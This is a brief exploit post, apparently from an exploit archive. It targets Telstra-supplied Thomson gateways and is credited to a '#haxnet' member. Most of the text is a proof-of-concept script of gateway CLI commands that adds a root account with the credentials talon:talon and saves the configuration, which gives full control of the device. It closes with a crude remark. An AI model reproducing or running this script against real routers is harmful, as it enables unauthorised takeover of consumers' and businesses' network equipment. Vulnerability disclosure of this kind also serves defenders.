Telstra thompson gateway - root exploit

Telstra is an ISP here in Australia, it is also the same isp wich owns the
NBN

Author: Talon ( #haxnet member)


PoC script:

script add name addroot command user add name talon password talon role root
descr ROOT
script run name addroot pars
saveall


This would add a root user as talon:talon ,with complete control over the
gateway and anything running from it.
On behalf of talon, before it gets raped by some idling non @.
cheers
